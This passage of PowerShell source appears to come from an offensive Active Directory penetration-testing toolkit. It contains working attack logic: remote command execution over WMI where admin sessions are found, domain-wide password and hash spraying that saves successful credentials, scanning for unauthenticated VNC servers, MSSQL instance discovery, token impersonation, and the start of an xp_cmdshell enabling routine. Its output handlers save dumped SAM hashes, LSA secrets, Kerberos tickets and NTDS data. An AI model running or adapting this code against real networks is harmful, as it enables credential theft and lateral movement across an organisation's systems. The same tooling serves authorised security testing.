                $result = ExecCommand $ComputerName $encodedCommand
                # Ensure this class is used
                $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
                Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
                return $result

    

            }

            function AdminCount {
                param (
                    [string]$UserName,
                    [System.DirectoryServices.DirectorySearcher]$Searcher
                )

                $Searcher.Filter = "(sAMAccountName=$UserName)"
                $Searcher.PropertiesToLoad.Clear()
                $Searcher.PropertiesToLoad.Add("adminCount") > $null

                $user = $Searcher.FindOne()

                if ($user -ne $null) {
                    $adminCount = $user.Properties["adminCount"]
                    if ($adminCount -eq 1) {
                        return $true
                    }
                }
                return $false
            }

            function SessionHunter {
                param($ComputerName, $Command)

                $userSIDs = @()
                $domainCache = @{}
                $Searcher = New-Object System.DirectoryServices.DirectorySearcher
                $adminPresent = $false

                function GetDomainFQDNFromSID {
                    param($sid)
                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
                    $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
                    if (-not $domainCache[$objDomain]) {
                        try {
                            $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                            $domainCache[$objDomain] = $FQDN
                        }
                        catch {
                            return $objDomain
                        }
                    }
                    return $domainCache[$objDomain]
                }

                try {
                    $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
                }
                catch {
                    return
                }

                $userKeys = $remoteRegistry.GetSubKeyNames()

                foreach ($key in $userKeys) {
                    if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                        $userSIDs += $key
                    }
                }

                $remoteRegistry.Close()

                foreach ($sid in $userSIDs) {
                    try {
                        $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                        $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                        $username = $userTranslation.Value.Split('\')[1]
                
                        if (AdminCount -UserName $username -Searcher $Searcher) {
                            $adminPresent = $true
                            break
                        }
                    }
                    catch {}
                }

                if ($adminPresent) {
                    if ($Command -eq "") {
                        # We can just return as OSinfo was checked earlier in script
                        return "Successful connection PME"
            
                    }
                    elseif ($Command -ne "") {

                        return WMI $ComputerName -command $Command
            
                    }
                }

            }

            SessionHunter -ComputerName $computerName -command $Command

        }


        # Create and invoke runspaces for each computer
        foreach ($computer in $computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false
                    try { $result = $result.Trim() } catch {}

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
            
                    elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                         
                    elseif ($result -eq "Successful Connection PME") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    } 
            
                    elseif ($result -eq "Unable to connect") {}

                    elseif ($result -match "[a-zA-Z0-9]") {
                
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                        } 
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                            $filePath = switch ($Module) {
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "KerbDump" { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                                if ($ShowOutput) {
                                    $result | Write-Host
                                    Write-Host
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Host
                                Write-Host
                                $hasDisplayedResult = $true
                            }
                        }
                    } 
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })



        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()


    }

    ################################################################################################################
    ################################################## Function: Spray #############################################
    ################################################################################################################
    Function Method-Spray {
        Write-host

            
        # Create a directory entry for the specified domain
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
        $searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

        # Set the filter to query the domainDNS object
        $searcher.Filter = "(objectClass=domainDNS)"
        $domainObject = $searcher.FindOne()

        if ($domainObject.Properties.Contains("lockoutThreshold")) {
            $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
            # Check the lockout threshold value
            $LO_threshold = $lockoutThreshold

            if ($LO_threshold -eq "0") {
                $SafeLimit = 100000
            }
            elseif ($LO_threshold -lt 3) {
                Write-Host
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Lockout threshold is 2 or less. Aborting..."
                return
            }
            elseif ($LO_threshold -lt 4) {
                $SafeLimit = 1
            }
            else {
                $SafeLimit = $LO_threshold - 2
            }
        }
        else {
            
            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Threshold not found. Aborting..."
            return
        }
        
        # gut this out and replace with the new function
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

        # Display the $SafeLimit value
        Write-Output " - Lockout Threshold  : $LO_threshold"
        Write-Output " - Safety Limit value : $SafeLimit"
        Write-Output " - Removed disabled accounts from spraying"

        if ($SprayHash -ne "") {
            Write-Host
            $SprayPassword = ""
            $AccountAsPassword = $False

            if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64 -and $SprayHash.Length -ne 65) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                Write-Host 
                return
            }

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying with Hash value: $SprayHash"
            Write-Host

        }

        if ($SprayPassword -ne "") {
            $SprayHash = ""
            $AccountAsPassword = $False

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying with password value: $SprayPassword"
            Write-Host

        }


        if ($AccountAsPassword) {
            $SprayHash = ""
            $SprayPassword = ""

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying usernames as passwords"
            Write-Host
        }

        if ($EmptyPassword) {
            $SprayPassword = ""
            $SprayHash = ""
            $AccountAsPassword = $False     
    
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying empty passwords"
            Write-Host
        }


        foreach ($UserToSpray in $EnabledDomainUsers) {
            $Delay = Get-Random -Minimum 5 -Maximum 20
            Start-Sleep -Milliseconds $Delay

            Write-Verbose "Querying user $UserToSpray from LDAP"

            try {
                $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
                $searchResult = $searcher.FindOne()
                $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

                if ($badPwdCount -ge $SafeLimit) {
                    if (!$SuccessOnly) {
                        Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                        Write-Host "$Domain\$UserToSpray - Safe threshold met"
                        continue
                    }
                }
                # Hash Spraying
                if ($SprayHash -ne "") {
                    if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String }
                    elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain | Out-String }
                    elseif ($SprayHash.Length -eq 65) {
                        $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                        if ($colonCount -ne 1) {
                            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                            Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
                            Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
                            break
                        }
                    
                        $SprayHash = $SprayHash.Split(':')[1]
                        $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String
                    }

                    # Check for Unhandled exception
                    if ($Attempt.IndexOf("Unhandled rTickets exception:") -ne -1) {
                        if (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }    
                    } 
                    # Check for KDC_ERR_PREAUTH_FAILED
                    elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED") -ne -1) {
                        if (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }   
                    }
                    # Check for a value that only appears in a success status
                    elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                        "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
                    }
                }

                # Password Spraying
                if ($SprayPassword -ne "") {

                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $SprayPassword)
        
                    if ($Attempt.name -ne $null) {
                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                        "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
                    }

                    elseif (!$SuccessOnly) {
                        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                    }
    
                }


                # Account as password
                if ($AccountAsPassword) {

                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $UserToSpray)
        
                    if ($Attempt.name -ne $null) {
                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                        "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
                    }

                    elseif (!$SuccessOnly) {
                        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                    }
    
                }


                # EmptyPasswords
                if ($EmptyPassword) {
                    $password = ""
       
                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $password)
        
                    if ($Attempt.name -ne $null) {
                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                        "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
                    }

                    elseif (!$SuccessOnly) {
                        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                        Write-Host "$Domain\$UserToSpray"
                    }
                }
            }
            catch {
        
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "$Domain\$UserToSpray - Exception occurred: $($_.Exception.Message)"
        
            }
        }
    }

    ################################################################################################################
    ################################################## Function: VNC ###############################################
    ################################################################################################################
    Function Method-VNC {

        if ($Port -eq "") { $Port = "5900" } else { $Port = $Port }

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($ComputerName, $Port, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }


            if (!$connected) { $tcpClient.Close() ; return }

            function VNC-NoAuth {
                param(
                    [string]$ComputerName,
                    [int]$Port
                )
                try {
                    $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
                }
                catch {
                    Write-Host "Error: Unable to connect to $ComputerName on port $Port"
                    return "Connection Error"
                }

                try {
                    $networkStream = $tcpClient.GetStream()
                    $networkStream.ReadTimeout = 50
        
                    # Reading Version from Server
                    $buffer = New-Object byte[] 12
                    $read = $networkStream.Read($buffer, 0, 12)
                    if ($read -eq 0) { throw "No data received from the server" }
                    $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
                    # Sending Client Version
                    $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
                    $networkStream.Write($buffer, 0, $buffer.Length)

                    # Reading Supported Security Types
                    $buffer = New-Object byte[] 2
                    $read = $networkStream.Read($buffer, 0, 1)
                    if ($read -eq 0) { throw "No data received from the server" }
                    $numberOfSecTypes = $buffer[0]
                    $buffer = New-Object byte[] $numberOfSecTypes
                    $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
                    if ($read -eq 0) { throw "No data received from the server" }
                }
                catch {
                    Write-Host "Error: Handshake failed with $ComputerName on port $Port"
                    return "Handshake Error"
                }
                finally {
                    # Cleanup
                    if ($null -ne $networkStream) { $networkStream.Close() }
                    if ($null -ne $tcpClient) { $tcpClient.Close() }
                }

                # Check for Non-authentication (Type 1)
                if ($buffer -contains 1) {
                    return "Supported"
                }
                else {
                    return "Not Supported"
                }
            }

            $AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
            return "$AuthSupported"
        }

        # Create and invoke runspaces for each computer
        foreach ($computer in $computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Not Supported") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 

                    if ($result -eq "Handshake Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Supported") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
                    } 

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()


    }

    ################################################################################################################
    ################################################## Function: MSSQL #############################################
    ################################################################################################################
    Function Method-MSSQL {

        Add-Type -AssemblyName "System.Data"


        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($ComputerName, $MSSQL)

            function Send-UdpDatagram {
                param ([string]$ComputerName)

                $client = New-Object net.sockets.udpclient(0)
                $client.Client.ReceiveTimeout = 100

                $send = [Byte] 0x03
                try { [void] $client.send($send, $send.length, $ComputerName, 1434) }
                Catch { return "Unable to connect" }

                $ipep = New-Object net.ipendpoint([net.ipaddress]::any, 0)
                $receive = $null
                try {
                    $receive = $client.receive([ref]$ipep)
                }
                catch [System.Net.Sockets.SocketException] { return "Unable to connect" } 
                finally {
                    try { $client.close() } Catch {}
                }


                $rawData = [text.encoding]::ascii.getstring($receive)
                $instanceFullNames = @()

                $rawData -split ';;' | ForEach-Object {
                    if ($_ -match 'InstanceName;([^;]+)') {
                        $instanceName = $matches[1]
                        $instanceFullNames += "$ComputerName\$instanceName"
                    }
                }

                $instanceFullNames
            }

            return  Send-UdpDatagram -ComputerName $ComputerName

        }

        foreach ($computer in $computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        $AllInstances = @()

        function New-Searcher {
            $directoryEntry = [ADSI]"LDAP://$domain"
            $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
            $searcher.PageSize = 1000
            return $searcher
        }

        function Get-ADSQLInstances {
            param(
                [Parameter(Mandatory = $false)]
                [string]$LDAPFilter = "(servicePrincipalName=MSSQLSvc/*)"
            )

            # Initialize an empty array to hold all instances
            $AllInstances = @()

            # Use New-Searcher function to create the DirectorySearcher object
            $ADSearcher = New-Searcher
            $ADSearcher.Filter = $LDAPFilter
            $ADSearcher.SearchScope = "Subtree"
    
            try {
                $Results = $ADSearcher.FindAll()
                foreach ($Result in $Results) {
                    $Entry = $Result.GetDirectoryEntry()
                    $SPNs = $Entry.servicePrincipalName
                    foreach ($SPN in $SPNs) {
                        if ($SPN.StartsWith("MSSQLSvc/")) {
                            $InstanceDetails = $SPN.Replace("MSSQLSvc/", "").Split(":")
                            $ComputerName = $InstanceDetails[0]
                            $InstanceName = if ($InstanceDetails.Length -gt 1) { $InstanceDetails[1] } else { "Default" }

                            # Combine ComputerName and InstanceName
                            $FullInstanceName = if ($InstanceName -eq "Default" -or $InstanceName -eq "MSSQLSERVER") { 
                                $ComputerName.ToLower() 
                            }
                            else { 
                                "$($ComputerName.ToLower())\$InstanceName" 
                            }

                            # Add the full instance identifier to the AllInstances array
                            $AllInstances += $FullInstanceName
                        }
                    }
                }
            }
            finally {
                $ADSearcher.Dispose()
            }

            # Return the array of all instances
            return $AllInstances
        }

        if (!$IPAddress) { $AllInstances = Get-ADSQLInstances }


        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Unable to connect") { continue }

                    # Foreach result, store it in the AllInstances Array
                    $result | ForEach-Object { $AllInstances += $_ }

                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()
        $AllInstances = $AllInstances.ToUpper()
        $AllInstances = $AllInstances.Trim()
        $AllInstances = $AllInstances | Select -Unique | Sort-Object

        $MSSQLComputers = $AllInstances | ForEach-Object {
            $computerPart = ($_ -split '\\')[0]
            if ($computerPart -like '*.*') {
                $computerPart
            }
            else {
                $computerPart -split '\.' | Select-Object -First 1
            }
        }

        $UniqueMSSQLComputers = $MSSQLComputers | Sort-Object -Unique
        $FilePath = Join-Path -Path $MSSQL -ChildPath ("MSSQL-" + "All-Discovered-MSSQL-Servers" + ".txt")

        # Read existing entries from the file
        $ExistingEntries = @()
        if (Test-Path -Path $FilePath) {
            $ExistingEntries = Get-Content -Path $FilePath
        }

        # Compare and append only new entries
        $NewEntries = $UniqueMSSQLComputers | Where-Object { $_ -notin $ExistingEntries }
        $NewEntries | Add-Content -Path $FilePath -Encoding ASCII -Force -ErrorAction "SilentlyContinue"

        # Filter out instances not present in $Computers
        $ComputerNames = $Computers | ForEach-Object {
            if ($_.Properties["dnshostname"]) {
                $_.Properties["dnshostname"][0].ToUpper()
            }
            else {
                $_.ToUpper()
            }
        }
        $FilteredInstances = $AllInstances | Where-Object { $ComputerNames -contains $_.Split('\')[0] }

        # Assign the filtered list back to $AllInstances
        $AllInstances = $FilteredInstances

        function Display-ComputerStatus {
            param (
                [string]$ComputerName,
                [string]$OS,
                [System.ConsoleColor]$statusColor = 'White',
                [string]$statusSymbol = "",
                [string]$statusText = "",
                [int]$NameLength,
                [int]$OSLength,
                [string]$IpAddress,
                [string]$NamedInstance
            )

            # Prefix
            Write-Host "MSSQL " -ForegroundColor Yellow -NoNewline
            Write-Host "   " -NoNewline
    
            Write-Host ("{0,-16}" -f $IPAddress) -NoNewline
    
            # Display ComputerName, OS, and NamedInstance
            Write-Host ("{0,-$InstanceLength}" -f $NamedInstance) -NoNewline
            Write-Host "   " -NoNewline

            # Display status symbol and text
            Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
            Write-Host $statusText
        }


        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($NamedInstance, $Username, $Password, $LocalAuth, $Domain, $Command)

            try {
                Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}
"@ -Language CSharp
            }
            Catch {}
            function Invoke-Impersonation {
                param (
                    [Parameter(Mandatory = $false)]
                    [string]$Username,

                    [Parameter(Mandatory = $false)]
                    [string]$Password,

                    [Parameter(Mandatory = $false)]
                    [string]$Domain,
		
                    [Parameter(Mandatory = $false)]
                    [switch]$RevertToSelf
                )
	
                begin {
                    # Check if RevertToSelf switch is NOT provided
                    if (-not $RevertToSelf) {
                        # If any of the mandatory parameters are missing, throw an error
                        if (-not $Username -or -not $Password -or -not $Domain) {
                            Write-Output "[-] Username, Password, and Domain are mandatory unless the RevertToSelf switch is provided."
                            $PSCmdlet.ThrowTerminatingError((New-Object -TypeName System.Management.Automation.ErrorRecord -ArgumentList (New-Object Exception), "ParameterError", "InvalidArgument", $null))
                        }
                    }
                }

                process {
                    if ($RevertToSelf) {
                        if ([Advapi32]::RevertToSelf()) {
                            # Write-Output "[+] Successfully reverted to original user context."
                        }
                        else {
                            # Write-Output "[-] Failed to revert to original user. Error: $($Error[0].Exception.Message)"
                        }
                        return
                    }

                    $tokenHandle = [IntPtr]::Zero

                    # Use the LogonUser function to get a token
                    $result = [Advapi32]::LogonUser(
                        $Username,
                        $Domain,
                        $Password,
                        [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS,
                        [LogonProvider]::LOGON32_PROVIDER_DEFAULT,
                        [ref]$tokenHandle
                    )

                    if (-not $result) {
                        #Write-Output "[-] Failed to obtain user token. Error: $($Error[0].Exception.Message)"
                        return
                    }

                    # Impersonate the user
                    if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
                        [Advapi32]::CloseHandle($tokenHandle)
                        Write-Output "[-] Failed to impersonate user. Error: $($Error[0].Exception.Message)"
                        return
                    }
                    #Write-Output "[+] Impersonation successful"
                }
            }
            Function Invoke-SqlQuery {
                [CmdletBinding()]
                param(
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,

                    [Parameter(Mandatory = $true)]
                    [string]$Query,

                    [Parameter(Mandatory = $false)]
                    [string]$Username,

                    [Parameter(Mandatory = $false)]
                    [string]$Password
                )


                try {
                    # Create and open a SQL connection
                    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection $ConnectionString
                    $SqlConnection.Open()

                    # Create a SQL command object
                    $SqlCommand = $SqlConnection.CreateCommand()
                    $SqlCommand.CommandText = $Query

                    # Execute the query and return the results
                    $Result = $SqlCommand.ExecuteReader()
                    $Table = New-Object System.Data.DataTable
                    $Table.Load($Result)
                    $Table
                }
                catch {
                    Write-Error "An error occurred: $($_.Exception.Message)"
                }
                finally {
                    # Dispose SQL connection and command
                    if ($SqlCommand -ne $null) {
                        $SqlCommand.Dispose()
                    }
                    if ($SqlConnection -ne $null) {
                        $SqlConnection.Dispose()
                    }
                }
            }
            function MSSQL-Command {
                [CmdletBinding()]
                param (
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,
    
                    [Parameter(Mandatory = $true)]
                    [string]$Command
                )
    
                # Function to revert configurations
                function Revert-Config {
                    param (
                        [string]$Option,
                        [int]$Value
                    )
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure '$Option', $Value; RECONFIGURE;"
                }

                # Store the initial states
                $advancedOptionsConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options'"
                $xpCMDConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"

                # Enable 'Show Advanced Options' if needed
